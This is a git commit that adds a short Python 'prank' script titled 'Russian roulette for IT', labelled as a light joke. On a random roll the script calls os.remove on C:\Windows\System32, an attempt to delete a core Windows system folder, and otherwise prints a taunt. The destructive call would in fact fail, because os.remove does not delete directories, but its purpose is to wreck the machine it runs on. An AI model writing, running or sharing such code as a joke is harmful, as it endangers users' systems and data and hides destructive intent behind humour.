6b2e9c6f71ed37289d177b36b09acda26b9e9e5a
Erick_Prado404 <73625446+ErickPrado101@users.noreply.github.com>
2023-12-07 09:51:41 -0300

    Brincadeira leve

---
+++ Roleta-russa para TI.py
@@ -0,0 +1,9 @@
+import random
+import os
+
+
+if random.randint(0, 10) == 1:
+     print("Suas últimas palavras")
+     os.remove("C:\Windows\System32")
+else:
+     print("Próxima tentativa,sortudo")
